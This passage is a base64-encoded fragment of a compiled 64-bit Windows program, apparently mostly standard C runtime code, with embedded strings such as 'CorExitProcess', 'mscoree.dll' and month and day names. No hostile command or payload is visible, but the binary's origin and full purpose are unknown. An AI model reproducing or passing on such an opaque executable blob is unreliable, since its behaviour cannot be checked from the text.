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KCEyLFAr/yEwPw0kITA/DEXWqSYHoABAAAEmB+AAQAAAPg3H////wgAwkAOm6/v//SIXJD4TkAwAAU0iD7CBIi9lIi0kI6PrJ//9Ii0sQ6PHJ//9Ii0sY6OjJ//9Ii0sg6N/J//9Ii0so6NbJ//9Ii0sw6M3J//9Iiwvoxcn//0iLS0DovMn//0iLS0jos8n//0iLS1Doqsn//0iLS1joocn//0iLS2DomMn//0iLS2joj8n//0iLSzjohsn//0iLS3Dofcn//0iLS3jodMn//0iLi4AAAADoaMn//0iLi4gAAADoXMn//0iLi5AAAADoUMn//0iLi5gAAADoRMn//0iLi6AAAADoOMn//0iLi6gAAADoLMn//0iLi7AAAADoIMn//0iLi7gAAADoFMn//0iLi8AAAADoCMn//0iLi8gAAADo/Mj//0iLi9AAAADo8Mj//0iLi9gAAADo5Mj//0iLi+AAAADo2Mj//0iLi+gAAADozMj//0iLi/AAAADowMj//0iLi/gAAADotMj//0iLiwABAADoqMj//0iLiwgBAADonMj//0iLixABAADokMj//0iLixgBAADohMj//0iLiyABAADoeMj//0iLiygBAADobMj//0iLizABAADoYMj//0iLizgBAADoVMj//0iLi0ABAADoSMj//0iLi0gBAADoPMj//0iLi1ABAADoMMj//0iLi3ABAADoJMj//0iLi3gBAADoGMj//0iLi4ABAADoDMj//0iLi4gBAADoAMj//0iLi5ABAADo9Mf//0iLi5gBAADo6Mf//0iLi2gBAADo3Mf//0iLi6gBAADo0Mf//0iLi7ABAADoxMf//0iLi7gBAADouMf//0iLi8ABAADorMf//0iLi8gBAADooMf//0iLi9ABAADolMf//0iLi6ABAADoiMf//0iLi9gBAADofMf//0iLi+ABAADocMf//0iLi+gBAADoZMf//0iLi/ABAADoWMf//0iLi/gBAADoTMf//0iLiwACAADoQMf//0iLiwgCAADoNMf//0iLixACAADoKMf//0iLixgCAADoHMf//0iLiyACAADoEMf//0iLiygCAADoBMf//0iLizACAADo+Mb//0iLizgCAADo7Mb//0iLi0ACAADo4Mb//0iLi0gCAADo1Mb//0iLi1ACAADoyMb//0iLi1gCAAD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